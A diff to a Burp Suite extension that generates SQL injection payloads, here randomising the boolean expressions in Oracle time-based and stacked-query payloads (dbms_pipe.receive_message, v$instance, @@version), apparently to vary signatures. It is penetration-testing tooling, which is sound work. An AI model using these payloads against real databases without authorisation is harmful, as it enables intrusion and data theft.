@@ -12,6 +12,7 @@ try:
     from threading import Thread
     from random import randrange
     from java.awt.datatransfer import StringSelection
+    import random
     
 except ImportError:
     print "Failed to load dependencies."
@@ -684,7 +685,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         escapeChars = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
         
         #boolExpressions = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
-        boolExpressions = ["1=1", "1<2", "true"]
+        n1 = str(random.randint(1,49))
+        n2 = str(random.randint(50,100))
+        boolExpressions = [n1 + "=" + n1, n1 + "<" + n2, "true"]
         
         suffixes = ["", " -- ", "; -- "]
         
@@ -777,7 +780,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                     listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
                             if self._cbTimeBased.isSelected():
                                 if escapeChar:
-                                    listSQLi.append(prefix + escapeChar + ";select case when 1=1 then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) else null end from dual " + suffix + "\n")
+                                    listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) else null end from dual " + suffix + "\n")
                                     listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
                                     listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
                                     listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + "\n")
@@ -785,8 +788,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                     listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
                                     listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + "\n")
                                 else:
-                                    listSQLi.append(prefix + ";select case when 1=1 then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + suffix + "\n")
-                                    listSQLi.append(prefix + ";select case when 1=1 then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + suffix + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + "\n")
                         if self._cbMysqlBased.isSelected():
                             if self._cbStackedSQL.isSelected():
                                 listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
